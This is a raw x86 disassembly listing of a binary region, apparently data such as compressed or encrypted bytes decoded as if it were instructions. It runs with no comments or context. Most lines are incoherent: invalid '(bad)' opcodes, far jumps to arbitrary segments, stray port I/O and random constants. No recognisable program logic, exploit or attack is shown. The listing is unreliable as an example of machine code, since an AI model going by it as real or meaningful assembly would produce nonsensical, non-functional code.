  42389f:	sbb    eax,0x3370e69d
  4238a4:	(bad)  
  4238a5:	jmp    0x423926
  4238a7:	add    esi,DWORD PTR [eax+0x7fe2aad3]
  4238ad:	mov    eax,0x94715d69
  4238b2:	rcl    BYTE PTR [ecx],1
  4238b4:	and    ah,BYTE PTR [edx+0x63]
  4238b7:	push   edi
  4238b8:	or     al,0xcb
  4238ba:	out    dx,al
  4238bb:	xchg   esp,eax
  4238bc:	jo     0x4238e4
  4238be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238bf:	shl    bh,1
  4238c1:	jmp    0xbffc8622
  4238c6:	sbb    eax,0xba42ee2a
  4238cb:	cdq    
  4238cc:	adc    al,0xf9
  4238ce:	push   esp
  4238cf:	add    DWORD PTR [eax-0x2489f],ecx
  4238d5:	test   eax,0x45afbf8
  4238da:	jmp    0xdc356a80
  4238df:	sub    ch,BYTE PTR [edx]
  4238e1:	push   0x6b
  4238e3:	outs   dx,BYTE PTR ds:[esi]
  4238e4:	dec    ecx
  4238e5:	retf   0x254
  4238e8:	push   es
  4238e9:	mov    bh,0x4d
  4238eb:	mov    edi,0x90f68282
  4238f0:	aas    
  4238f1:	and    DWORD PTR [edx+esi*1],ecx
  4238f4:	cdq    
  4238f5:	or     BYTE PTR ds:0x4c34931f,dl
  4238fb:	jmp    0xca44:0x61ab1464
  423902:	shl    BYTE PTR [ebx+0x6c],cl
  423905:	pop    ebx
  423906:	or     BYTE PTR [eax+0xc7f79a3],bl
  42390c:	adc    ebx,ebx
  42390e:	cld    
  42390f:	scas   eax,DWORD PTR es:[edi]
  423910:	add    eax,DWORD PTR [eax]
	...
  423972:	add    BYTE PTR [eax],al
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xfa172bbd
  423982:	rcl    DWORD PTR [edx+0x1f],1
  423985:	jl     0x423988
  423987:	add    BYTE PTR ds:0x31000001,al
  42398d:	inc    esp
  42398e:	rol    DWORD PTR [ecx],0x88
  423991:	(bad)  
  423992:	sbb    bl,BYTE PTR [edi+edx*2+0x13]
  423996:	scas   eax,DWORD PTR es:[edi]
  423997:	add    ebx,ecx
  423999:	mov    ecx,0x91fcb374
  42399e:	mov    edi,0x10c288a1
  4239a3:	inc    ebx
  4239a4:	adc    dl,BYTE PTR [edx-0xa]
  4239a7:	jg     0x423929
  4239a9:	cmp    eax,0x2fd84785
  4239ae:	cdq    
  4239af:	pusha  
  4239b0:	jbe    0x4239de
  4239b2:	out    dx,al
  4239b3:	pop    ss
  4239b4:	mov    WORD PTR [ecx],gs
  4239b6:	das    
  4239b7:	mov    al,ds:0x1960bfc5
  4239bc:	mov    ebp,DWORD PTR [eax+0x22]
  4239bf:	cmp    dl,BYTE PTR [esi-0x1d]
  4239c2:	bound  eax,QWORD PTR [edi]
  4239c4:	mov    edi,0xfdda1105
  4239c9:	cwde   
  4239ca:	(bad)  
  4239cb:	mov    ch,0xdb
  4239cd:	(bad)
  4239d1:	push   eax
  4239d2:	xchg   ebp,eax
  4239d3:	addr16 aam 0x38
  4239d6:	pop    ebp
  4239d7:	mov    ds:0xfcc256a3,al
  4239dc:	sar    BYTE PTR [ebp-0x7d98d735],cl
  4239e2:	mov    bl,0x5b
  4239e4:	sahf   
  4239e5:	xchg   ebx,eax
  4239e6:	sbb    eax,0x5f5674e7
  4239eb:	retf   0xf9a9
  4239ee:	pop    ecx
  4239ef:	mov    ebp,0x4ef22eb3
  4239f4:	mov    dl,BYTE PTR [eax-0x60182632]
  4239fa:	stos   DWORD PTR es:[edi],eax
  4239fb:	(bad)  
  4239fc:	jmp    ebx
  4239fe:	mov    dh,0x3f
  423a00:	mov    eax,0x29f4c9b1
  423a05:	jno    0x423a3e
  423a07:	outs   dx,DWORD PTR ds:[esi]
  423a08:	push   ebx
  423a09:	es push 0x97cee13a
  423a0f:	sbb    DWORD PTR [ecx],eax
  423a11:	out    0xb2,al
  423a13:	leave  
  423a14:	push   ecx
  423a15:	popf   
  423a16:	pop    ds
  423a17:	sub    al,0x9a
  423a19:	dec    edi
  423a1a:	jle    0x4239de
  423a1c:	and    eax,0x16bd84a5
  423a21:	rdpmc  
  423a23:	div    DWORD PTR [edi]
  423a25:	shl    DWORD PTR [ebx+0x5],1
  423a28:	cmp    bh,BYTE PTR [ebx+ecx*2+0x87f77cf]
  423a2f:	jbe    0x423a21
  423a31:	cmp    DWORD PTR [eax],edx
  423a33:	or     edi,edi
  423a35:	xchg   ch,ch
  423a37:	cmp    ah,cl
  423a39:	push   ebx
  423a3a:	ja     0x423a22
  423a3c:	inc    ebx
  423a3d:	mov    bh,0xa4
  423a3f:	xor    BYTE PTR [edi-0x53],cl
  423a42:	hlt    
  423a43:	sbb    bl,BYTE PTR [edx+0x24]
  423a46:	jns    0x4239e4
  423a48:	jae    0x4239db
  423a4a:	sub    DWORD PTR [ebp+0x25f9e5ce],esp
  423a50:	stos   DWORD PTR es:[edi],eax
  423a51:	mov    ecx,0xff3edba4
  423a56:	xchg   BYTE PTR [edi+0x36],bl
  423a59:	push   edi
  423a5a:	cmp    eax,0x860f32b8
  423a5f:	cmp    al,0xbe
  423a61:	shl    DWORD PTR [ebx-0x1557a73e],0x6d
  423a68:	jbe    0x423a3f
  423a6a:	jmp    0x5918:0xf7ae28e0
  423a71:	sbb    BYTE PTR ss:[ebp-0x37],cl
  423a75:	popa   
  423a76:	mov    esp,0x5fad0f40
  423a7b:	pop    edx
  423a7c:	and    BYTE PTR ds:[esi-0x4a4d3b5a],bl
  423a83:	xchg   esp,eax
  423a84:	jmp    0xca6b:0x437ebde3
  423a8b:	pushf  
  423a8c:	xchg   DWORD PTR [eax],edx
  423a8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a8f:	cli    
  423a90:	add    al,BYTE PTR [eax]
	...
  423af2:	add    BYTE PTR [eax],al
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	cwde   
  423b01:	sbb    dl,BYTE PTR [edi+0x44]
  423b04:	and    al,0x7d
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    eax,0x68000001
  423b0d:	pop    edi
  423b0e:	sti    
  423b0f:	hlt    
  423b10:	(bad)  
  423b11:	jno    0x423b35
  423b13:	or     DWORD PTR [esi*2-0x14421192],edx
  423b1a:	sbb    al,0xed
  423b1c:	retf   
  423b1d:	int3   
  423b1e:	dec    edi
  423b1f:	aam    0x79
  423b21:	cdq    
  423b22:	cmovs  eax,DWORD PTR [edx+0x43f4a9a8]
  423b29:	inc    esi
  423b2a:	bound  ebp,QWORD PTR [edx-0x11b08b7e]
  423b30:	mov    edx,DWORD PTR [ecx]
  423b32:	add    esp,DWORD PTR cs:[ebx-0x29e020d9]
  423b39:	pop    edi
  423b3a:	repz mov ecx,0x8a96a3d6
  423b40:	loope  0x423ae8
  423b42:	in     al,0x9
  423b44:	cmp    eax,0xf86de819
  423b49:	and    ah,BYTE PTR [esi+0x651f140e]
  423b4f:	xchg   ebp,eax
  423b50:	sub    bl,ch
  423b52:	mov    ?,WORD PTR [edx]
  423b54:	jge    0x423b36
  423b56:	xchg   ecx,eax
  423b57:	outs   dx,DWORD PTR ds:[esi]
  423b58:	dec    ecx
  423b59:	push   es
  423b5a:	dec    ecx
  423b5b:	push   ds
  423b5c:	sub    eax,0x39bd6288
  423b61:	pop    es
  423b62:	cmp    ebx,ecx
  423b64:	test   al,0x57
  423b66:	jmp    0xb407962
  423b6b:	sub    eax,0x7747c0b3
  423b70:	mov    edi,0xc8aa207
  423b75:	ret    0x152d
  423b78:	inc    esp
  423b79:	and    al,0xdf
  423b7b:	and    BYTE PTR [eax-0x3213caa6],cl
  423b81:	clc    
  423b82:	push   esp
  423b83:	ins    BYTE PTR es:[edi],dx
  423b84:	imul   ebp,DWORD PTR [ecx],0xffffffe3
  423b87:	xchg   edi,eax
  423b88:	mov    bh,0x7d
  423b8a:	jmp    0x59f3:0x704a0bc2
  423b91:	in     al,dx
  423b92:	xchg   ecx,eax
  423b93:	bound  ebp,QWORD PTR [edx+0x690b4469]
  423b99:	sub    esp,DWORD PTR [esi+0x57]
  423b9c:	add    DWORD PTR [eax+0x5e],ecx
  423b9f:	adc    edx,DWORD PTR [ebp+0x7323b225]
  423ba5:	lds    edx,FWORD PTR [ebp+0xe]
  423ba8:	cli    
  423ba9:	xor    DWORD PTR [edx-0x6c],ebx
  423bac:	dec    ecx
  423bad:	mov    ah,0xf9
  423baf:	pushf  
  423bb0:	test   al,0xbb
  423bb2:	jo     0x423bc4
  423bb4:	and    BYTE PTR ds:[edx+0x1f],dl
  423bb8:	cmp    edi,DWORD PTR [eax+eiz*1-0x2d]
  423bbc:	dec    ecx
  423bbd:	or     ebx,esp
  423bbf:	cmp    al,0xd1
  423bc1:	sub    eax,0xfdd5c720
  423bc6:	inc    edx
  423bc7:	shl    BYTE PTR [ebx],0x7f
  423bca:	push   ds
  423bcb:	int3   
  423bcc:	(bad)  
  423bcd:	cdq    
  423bce:	ret    0xf831
  423bd1:	adc    DWORD PTR [edx],ebx
  423bd3:	iret   
  423bd4:	jo     0x423bdf
  423bd6:	outs   dx,DWORD PTR ds:[esi]
  423bd7:	sub    cl,BYTE PTR [esi-0x4f32034b]
  423bdd:	cmp    al,0x65
  423bdf:	inc    eax
  423be0:	bound  edi,QWORD PTR [eax+0x49]
  423be3:	jg     0x423bf2
  423be5:	push   esp
  423be6:	nop
  423be7:	out    dx,eax
  423be8:	mov    ecx,DWORD PTR [esi-0x30]
  423beb:	mov    ds:0x5ad3020c,eax
  423bf0:	repnz (bad) 
  423bf2:	xor    DWORD PTR fs:[ebp+0x359fd500],ebp
  423bf9:	inc    ebp
  423bfa:	out    0xe,al
  423bfc:	sbb    eax,0xc8c9817d
  423c01:	cld    
  423c02:	sbb    ch,BYTE PTR [esi+0x60]
  423c05:	fwait
  423c06:	sub    eax,0x4e10abea
  423c0b:	inc    edx
  423c0c:	gs dec ecx
  423c0e:	iret   
  423c0f:	aam    0x9
	...
  423c71:	add    BYTE PTR [eax],al
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax-0x2cbb99e9]
  423c81:	xchg   DWORD PTR [edx+eiz*2],ecx
  423c84:	sub    DWORD PTR [esi+0x1],edi
  423c87:	add    BYTE PTR ds:0x39000001,al
  423c8d:	and    DWORD PTR [eax-0x37],0xffffffdf
  423c91:	inc    edx
  423c92:	ror    DWORD PTR [esp+ebp*2+0x5bffbe76],1
  423c99:	push   ebp
  423c9a:	call   0xfac5ef5f
  423c9f:	sbb    dh,BYTE PTR [edx+0x58935ef7]
  423ca5:	je     0x423cc6
  423ca7:	into   
  423ca8:	std    
  423ca9:	cmp    al,0xc3
  423cab:	shl    ecx,cl
  423cad:	gs dec ebx
  423caf:	xchg   edx,eax
  423cb0:	dec    ebp
  423cb1:	das    
  423cb2:	push   esi
  423cb3:	pop    ss
  423cb4:	cdq    
  423cb5:	mov    ecx,DWORD PTR [esi]
  423cb7:	pusha  
  423cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cb9:	inc    ebx
  423cba:	pop    ds
  423cbb:	lods   eax,DWORD PTR ds:[esi]
  423cbc:	dec    ebp
  423cbd:	pop    es
  423cbe:	pop    ebp
  423cbf:	ret    0x5e2d
  423cc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cc3:	call   FWORD PTR [ebx+0x5958dd7c]
  423cc9:	jnp    0x423d38
  423ccb:	xchg   esp,eax
  423ccc:	inc    esi
  423ccd:	js     0x423d47
  423ccf:	and    BYTE PTR [edx-0x8],dl
  423cd2:	dec    esi
  423cd3:	lahf   
  423cd4:	dec    ebp
  423cd5:	mov    edx,edi
  423cd7:	xor    eax,DWORD PTR [ebx-0x39aebfde]
  423cdd:	into   
  423cde:	and    ebx,DWORD PTR [edi]
  423ce0:	xchg   DWORD PTR [edi+edx*8+0x7f],edx
  423ce4:	jp     0x423d28
  423ce6:	mov    edi,esp
  423ce8:	nop
  423ce9:	dec    ecx
  423cea:	and    dh,BYTE PTR [ecx]
  423cec:	mov    edi,0x8b619f4b
  423cf1:	dec    eax
  423cf2:	call   0xa784:0xf9bce257
  423cf9:	inc    BYTE PTR [edi]
  423cfb:	cmp    DWORD PTR [ecx],0x37
  423cfe:	push   ebp
  423cff:	push   edi
  423d00:	aad    0x60
  423d02:	mov    esp,0xfc2cb3d5
  423d07:	ret    
  423d08:	inc    ebx
  423d09:	sbb    dh,ch
  423d0b:	and    BYTE PTR [ebx+0x1c4d0ad7],ch
  423d11:	push   edi
  423d12:	icebp  
  423d13:	and    eax,0x97d63aa7
  423d18:	mov    ds:0xa9c669e9,al
  423d1d:	xchg   esi,eax
  423d1e:	retf   
  423d1f:	jmp    0x780d:0x6bb660bb
  423d26:	(bad)  
  423d28:	jmp    0x423cfa
  423d2a:	cmp    eax,0xe65c48bf
  423d2f:	das    
  423d30:	mov    cl,ah
  423d32:	sub    BYTE PTR [ebx-0x4a9bd0e],cl
  423d38:	ficomp DWORD PTR [ebx-0x50217c78]
  423d3e:	or     eax,0x4d270be2
  423d43:	inc    ebp
  423d44:	and    dh,bl
  423d46:	idiv   BYTE PTR [edi+edi*2+0xf]
  423d4a:	outs   dx,DWORD PTR ds:[esi]
  423d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d4c:	xchg   bh,ch
  423d4e:	ror    BYTE PTR [eax+0x647e115c],cl
  423d54:	jecxz  0x423d4d
  423d56:	inc    ecx
  423d57:	jno    0x423d7c
  423d59:	aad    0x25
  423d5b:	mov    esi,0x92f2f36c
  423d60:	mov    eax,ecx
  423d62:	pop    edx
  423d63:	add    ch,BYTE PTR [esi+eiz*1-0x14]
  423d67:	mov    bh,0x9f
  423d69:	cmp    eax,0xcb580aa6
  423d6e:	pusha  
  423d6f:	arpl   WORD PTR [ebx-0x39c66c3a],bx
  423d75:	add    BYTE PTR [ebp-0x1ee631c4],ah
  423d7b:	std    
  423d7c:	jecxz  0x423da1
  423d7e:	jae    0x423d7f
  423d80:	dec    ebp
  423d81:	div    BYTE PTR [esi]
  423d83:	add    BYTE PTR [esp+eiz*2-0x45],dl
  423d87:	xchg   edx,eax
  423d88:	jns    0x423d6e
  423d8a:	scas   eax,DWORD PTR es:[edi]
  423d8b:	or     ebx,eax
  423d8d:	cmp    WORD PTR [ebx],0xc6
	...
  423df2:	add    BYTE PTR [eax],al
  423df4:	(bad)  
  423df5:	test   BYTE PTR [edi-0x118668f7],0xff
  423dfc:	daa    
  423dfd:	mov    DWORD PTR [eax-0x4b5a782e],esp
  423e03:	ret    0x7f2e
  423e06:	add    DWORD PTR [eax],eax
  423e08:	add    eax,0x5b000001
  423e0d:	icebp  
  423e0e:	cmp    ah,ch
  423e10:	lock faddp st(1),st
  423e13:	cmp    eax,0x7888d5b3
  423e18:	inc    esp
  423e19:	adc    bh,BYTE PTR [ebp+ecx*1+0x4d48340a]
  423e20:	adc    ah,BYTE PTR [edi+0x2d]
  423e23:	add    eax,DWORD PTR [ebx]
  423e25:	rcr    BYTE PTR [esi+0x53bf9121],cl
  423e2b:	dec    ebx
  423e2c:	or     al,ch
  423e2e:	fimul  DWORD PTR [esi-0x65d01d]
  423e34:	call   0x9cd20486
  423e39:	pop    es
  423e3a:	test   DWORD PTR [edi-0x1],ebx
  423e3d:	sub    BYTE PTR cs:[di],ch
  423e41:	ins    BYTE PTR es:[edi],dx
  423e42:	(bad)  
  423e43:	repnz shl BYTE PTR [ebx+0x37],0x3b
  423e48:	sub    cl,BYTE PTR [edx+ebx*4-0x6adc320f]
  423e4f:	sbb    bl,BYTE PTR [edi-0x45]
  423e52:	out    dx,al
  423e53:	repnz sub eax,0x60c5c7f9
  423e59:	dec    ecx
  423e5a:	ret    0x6388
  423e5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e5e:	fst    DWORD PTR [ecx+0x49992646]
  423e64:	xchg   ebx,eax
  423e65:	loop   0x423eac
  423e67:	dec    ebp
  423e68:	cmp    BYTE PTR [esi],dh
  423e6a:	pop    esp
  423e6b:	lahf   
  423e6c:	call   0xa7c69faf
  423e71:	icebp  
  423e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e73:	cld    
  423e74:	pop    edi
  423e75:	sub    eax,0xeb2f0d33
  423e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e7b:	pop    esp
  423e7c:	(bad)  
  423e7d:	push   ebx
  423e7e:	mov    ds:0x8a142ccc,al
  423e83:	imul   ecx,DWORD PTR [edi],0xd9dd450
  423e89:	jns    0x423e0e
  423e8b:	xchg   ecx,eax
  423e8c:	or     esi,eax
  423e8e:	sub    al,0x60
  423e90:	aaa    
  423e91:	add    ecx,DWORD PTR [edx-0x48]
  423e94:	xchg   edx,eax
  423e95:	enter  0xd472,0xd0
  423e99:	xor    al,BYTE PTR [edx-0x48]
  423e9c:	lds    ecx,FWORD PTR [esi-0x9]
  423e9f:	mov    dh,0x89
  423ea1:	cmp    eax,0x8f910159
  423ea6:	test   BYTE PTR [esi+0x3e413ba9],ah
  423eac:	repz lahf 
  423eae:	loop   0x423ef2
  423eb0:	mov    edi,0x841441e8
  423eb5:	pop    ebp
  423eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423eb7:	sahf   
  423eb8:	mov    esp,0xe9940ce7
  423ebd:	sub    DWORD PTR [edi],ebx
  423ebf:	stc    
  423ec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ec1:	inc    esp
  423ec2:	stos   DWORD PTR es:[edi],eax
  423ec3:	pop    esi
  423ec4:	xchg   ebx,eax
  423ec5:	mov    bl,0xea
  423ec7:	xor    eax,0xa7a87dce
  423ecc:	jae    0x423ee4
  423ece:	test   DWORD PTR [edx+0x3e4725e5],ebp
  423ed4:	cwde   
  423ed5:	stos   DWORD PTR es:[edi],eax
  423ed6:	(bad)  
  423ed7:	in     al,0xbb
  423ed9:	fwait
  423eda:	(bad)  
  423edb:	jb     0x423f11
  423edd:	arpl   WORD PTR [ebx+0x2f],di
  423ee0:	dec    ecx
  423ee1:	fs mov ecx,0xcb151bfd
  423ee7:	dec    ecx
  423ee8:	cmp    eax,0xbb33a71f
  423eed:	out    0xd1,al
  423eef:	pushf  
  423ef0:	jnp    0x423f2b
  423ef2:	push   ebp
  423ef3:	fucomip st,st(1)
  423ef5:	ret    0xb46e
  423ef8:	js     0x423e94
  423efa:	mul    DWORD PTR [ebx+eiz*2]
  423efd:	xchg   edx,eax
  423efe:	lea    esp,[edx-0x35]
  423f01:	pop    edi
  423f02:	int    0xd4
  423f04:	retf   
  423f05:	adc    al,BYTE PTR [edx-0x75]
  423f08:	inc    eax
  423f09:	arpl   WORD PTR [ebx],bp
  423f0b:	jmp    0xee:0xc3c9388c
	...
  423f72:	add    BYTE PTR [eax],al
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	call   0x34220848
  423f85:	add    BYTE PTR [ecx],0x0
  423f88:	add    eax,0x6b000001
  423f8d:	add    BYTE PTR [ebx+0x7ce568af],al
  423f93:	sub    dl,BYTE PTR ds:0x646bac72
  423f99:	aaa    
  423f9a:	loope  0x423fa9
  423f9c:	and    dl,BYTE PTR [edx-0x44affcac]
  423fa2:	mov    WORD PTR [eax-0x34],cs
  423fa5:	mov    eax,DWORD PTR [ebx+0x60]
  423fa8:	jnp    0x423fdb
  423faa:	jmp    0xa8c0:0x44eb3aad
  423fb1:	or     DWORD PTR [eax-0x736d8bd],esi
  423fb7:	sti    
  423fb8:	popa   
  423fb9:	dec    BYTE PTR [ebx]
  423fbb:	imul   esi,DWORD PTR [ebx+0x17],0x45
  423fbf:	adc    eax,0xf58fa206
  423fc4:	xlat   BYTE PTR ds:[ebx]
  423fc5:	nop
  423fc6:	xor    edi,esp
  423fc8:	pop    edx
  423fc9:	out    0x44,eax
  423fcb:	rcl    BYTE PTR [edx],1
  423fcd:	xchg   esp,eax
  423fce:	push   ss
  423fcf:	and    al,0xfd
  423fd1:	aas    
  423fd2:	add    al,0xa6
  423fd4:	dec    ebp
  423fd5:	lods   al,BYTE PTR ds:[esi]
  423fd6:	jb     0x424029
  423fd8:	jbe    0x423fbb
  423fda:	cmp    BYTE PTR [edx],ah
  423fdc:	sub    DWORD PTR [eax-0x14],esi
  423fdf:	push   edx
  423fe0:	cli    
  423fe1:	(bad)  
  423fe2:	cmp    esp,ebx
  423fe4:	(bad)  
  423fe5:	aad    0xd1
  423fe7:	or     DWORD PTR [esi-0x69],0xfef9eeb9
  423fee:	in     al,0x82
  423ff0:	ficomp WORD PTR [ebx+ecx*2]
  423ff3:	add    BYTE PTR [eax+0x54],bh
  423ff6:	sbb    al,0x8e
  423ff8:	adc    BYTE PTR [ecx-0x19],dh
  423ffb:	or     ch,BYTE PTR [ebp+0x2d881dbb]
  424001:	retf   0xcc8e
  424004:	xchg   BYTE PTR [ecx-0x2f],bl
  424007:	jecxz  0x42407e
  424009:	(bad)  
  42400a:	or     edx,DWORD PTR [eax+eiz*4]
  42400d:	push   ss
  42400e:	aam    0xb0
  424010:	mov    esi,ebp
  424012:	retf   
  424013:	sub    al,0x7c
  424015:	data16 or dl,0xf6
  424019:	xlat   BYTE PTR ds:[ebx]
  42401a:	ins    BYTE PTR es:[edi],dx
  42401b:	add    al,0xe7
  42401d:	pop    edi
  42401e:	je     0x423fff
  424020:	push   eax
  424021:	call   0xcb9b7782
  424026:	and    eax,0x1c65b63c
  42402b:	in     eax,0xfc
  42402d:	outs   dx,BYTE PTR ds:[esi]
  42402e:	sub    edi,DWORD PTR [eax+0x451f3799]
  424034:	clc    
  424035:	hlt    
  424036:	push   ebp
  424037:	fxch   st(7)
  424039:	dec    edi
  42403a:	push   eax
  42403b:	into   
  42403c:	mov    dh,0x37
  42403e:	jns    0x424088
  424040:	mov    dl,0x9e
  424042:	imul   ecx,DWORD PTR [edx],0xffffff92
  424045:	jmp    DWORD PTR [ebx-0x22e182d7]
  42404b:	ins    DWORD PTR es:[edi],dx
  42404c:	xchg   edx,eax
  42404d:	lea    ebx,[edi]
  42404f:	push   ebp
  424050:	cmp    BYTE PTR [ecx+0x15c6ca04],dl
  424056:	push   edx
  424057:	call   0xf88f9cf0
  42405c:	aad    0xb3
  42405e:	dec    edi
  42405f:	xchg   edi,eax
  424060:	int    0xb3
  424062:	test   esp,esp
  424064:	push   edx
  424065:	adc    BYTE PTR [edi-0x7194285d],0x9c
  42406c:	das    
  42406d:	scas   eax,DWORD PTR es:[edi]
  42406e:	jno    0x42408c
  424070:	imul   bp,WORD PTR [edi+edx*1],0x6be3
  424076:	push   0x883d7184
  42407b:	or     al,0x44
  42407d:	stos   BYTE PTR es:[edi],al
  42407e:	mov    al,ds:0x78c20cb1
  424083:	nop
  424084:	dec    esi
  424085:	lods   al,BYTE PTR ds:[esi]
  424086:	dec    ecx
  424087:	fist   DWORD PTR [eax+0xcd62782]
  42408d:	push   cs
  42408e:	adc    eax,0x1bcf
	...
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	inc    esp
  424101:	push   ss
  424102:	dec    esi
  424103:	fdivr  QWORD PTR [eax]
  424105:	add    DWORD PTR [ecx],0x10500
  42410b:	add    BYTE PTR [edx+0x18],dl
  42410e:	dec    ebp
  42410f:	mov    WORD PTR [esi+0x2043e4d3],gs
  424115:	push   edi
  424116:	inc    edx
  424117:	sbb    ch,dl
  424119:	xchg   DWORD PTR [edx+eiz*2],edi
  42411c:	and    DWORD PTR [edi-0x1313b984],ebp
  424122:	pop    esi
  424123:	repnz sbb al,0x31
  424126:	ins    BYTE PTR es:[edi],dx
  424127:	data16 or ah,BYTE PTR [edx-0x6]
  42412b:	add    edx,DWORD PTR cs:[edi]
  42412e:	daa    
  42412f:	cld    
  424130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424131:	xor    BYTE PTR [eax-0x72],0xe4
  424135:	inc    esp
  424136:	mov    ebp,0xf2b15101
  42413b:	mov    esp,0xabf39109
  424140:	pop    ss
  424141:	repnz aaa 
  424143:	fdivr  st,st(1)
  424145:	xor    edi,DWORD PTR [edx]
  424147:	(bad)  
  424148:	in     eax,0xff
  42414a:	or     al,0xd0
  42414c:	sub    cl,cl
  42414e:	repnz push ebx
  424151:	push   eax
  424152:	or     cl,BYTE PTR [ebx-0x80]
  424155:	int3   
  424156:	addr16 test ebp,esp
  424159:	aad    0xea
  42415b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42415c:	jbe    0x42411a
  42415e:	cmp    BYTE PTR [eax+eax*8],ah
  424161:	xchg   esp,eax
  424162:	xor    WORD PTR [edx],dx
  424165:	xchg   ebp,eax
  424166:	ds jmp 0x88c36c0f
  42416c:	mov    ebx,0x6769dc17
  424171:	cmp    al,0x71
  424173:	ret    0x71db
  424176:	cmp    cl,BYTE PTR [eax-0x36]
  424179:	ret    
  42417a:	xchg   BYTE PTR [esi-0x3574bf40],ah
  424180:	mov    ebp,0x14debe8c
  424185:	and    BYTE PTR [ecx-0x10],0x9
  424189:	(bad)  
  42418a:	(bad)  
  42418b:	sub    bh,BYTE PTR [ebx+0x65]
  42418e:	cwde   
  42418f:	adc    eax,0x1cd249b3
  424194:	cmp    dh,bl
  424196:	jle    0x424176
  424198:	popf   
  424199:	daa    
  42419a:	sbb    eax,edx
  42419c:	mov    eax,db3
  42419f:	outs   dx,DWORD PTR ds:[esi]
  4241a0:	inc    eax
  4241a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241a2:	xchg   ebp,eax
  4241a3:	and    BYTE PTR [ebx],dh
  4241a5:	jl     0x42418a
  4241a7:	mov    edi,0xb6a483a1
  4241ac:	xchg   ebp,eax
  4241ad:	sbb    ebp,DWORD PTR [ebx]
  4241af:	cwde   
  4241b0:	(bad)  
  4241b1:	pusha  
  4241b2:	sub    DWORD PTR [edx+edx*8],esp
  4241b5:	rol    DWORD PTR [edx+0x26],1
  4241b8:	pop    ecx
  4241b9:	(bad)  
  4241ba:	in     eax,0xe3
  4241bc:	lock cmp DWORD PTR [ebx],eax
  4241bf:	loopne 0x42417f
  4241c1:	xor    ebp,DWORD PTR [esi+0x48]
  4241c4:	(bad)  
  4241c5:	hlt    
  4241c6:	mov    ch,0x1a
  4241c8:	popf   
  4241c9:	rcr    DWORD PTR [esi],0x15
  4241cc:	lods   eax,DWORD PTR ds:[esi]
  4241cd:	cmp    BYTE PTR [edi+0x3b],ah
  4241d0:	iret   
  4241d1:	scas   al,BYTE PTR es:[edi]
  4241d2:	ins    DWORD PTR es:[edi],dx
  4241d3:	cli    
  4241d4:	mov    ds:0xa69f9bec,al
  4241d9:	arpl   WORD PTR [edi-0x75a9b6d6],ax
  4241df:	add    BYTE PTR [esi],ch
  4241e1:	aad    0x76
  4241e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241e4:	jae    0x424218
  4241e6:	aaa    
  4241e7:	scas   al,BYTE PTR es:[edi]
  4241e8:	or     DWORD PTR [ebx+0x57],esp
  4241eb:	scas   al,BYTE PTR es:[edi]
  4241ec:	push   ss
  4241ed:	xlat   BYTE PTR ds:[ebx]
  4241ee:	div    BYTE PTR [esi]
  4241f0:	lds    edi,FWORD PTR [edi-0x3d00a7a8]
  4241f6:	lea    edx,ds:[esi]
  4241f9:	and    bl,bh
  4241fb:	adc    dh,BYTE PTR [esi+0x77]
  4241fe:	aad    0x92
  424200:	not    BYTE PTR [ebp-0x66507bc4]
  424206:	push   ss
  424207:	ret    
  424208:	test   al,0x68
  42420a:	lods   al,BYTE PTR ds:[esi]
  42420b:	aaa    
  42420c:	fisttp WORD PTR [eax]
  42420e:	pop    es
  42420f:	aad    0xc6
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	leave  
  424281:	mov    esp,0x823dcd39
  424286:	add    DWORD PTR [eax],eax
  424288:	add    eax,0x22000001
  42428d:	sub    al,0x48
  42428f:	push   0x47
  424291:	mov    eax,0xbf6802b2
  424296:	hlt    
  424297:	jae    0x42421b
  424299:	push   esi
  42429a:	mov    al,0xe1
  42429c:	fistp  QWORD PTR ds:0x8f1786c
  4242a2:	ja     0x4242e4
  4242a4:	repnz pop ebp
  4242a6:	add    esp,DWORD PTR [edx+0x24dcb411]
  4242ac:	adc    ch,ah
  4242ae:	std    
  4242af:	call   0x8546:0x7d2d0228
  4242b6:	and    bh,ch
  4242b8:	in     al,0xdb
  4242ba:	call   0xb4e9cf1e
  4242bf:	jae    0x4242a5
  4242c1:	addr16 pusha 
  4242c3:	ror    DWORD PTR [eax+0x3d31ae67],cl
  4242c9:	sub    eax,0xb4e824ba
  4242ce:	call   0x1116dfad
  4242d3:	or     dl,dl
  4242d5:	inc    edi
  4242d6:	mov    dl,0xb0
  4242d8:	pop    edx
  4242d9:	xor    eax,0x6eb3e54f
  4242de:	sbb    eax,0xf61123d1
  4242e3:	push   esp
  4242e4:	sub    BYTE PTR [edx],al
  4242e6:	int3   
  4242e7:	mov    esp,0x5fce0659
  4242ec:	fdiv   st,st(3)
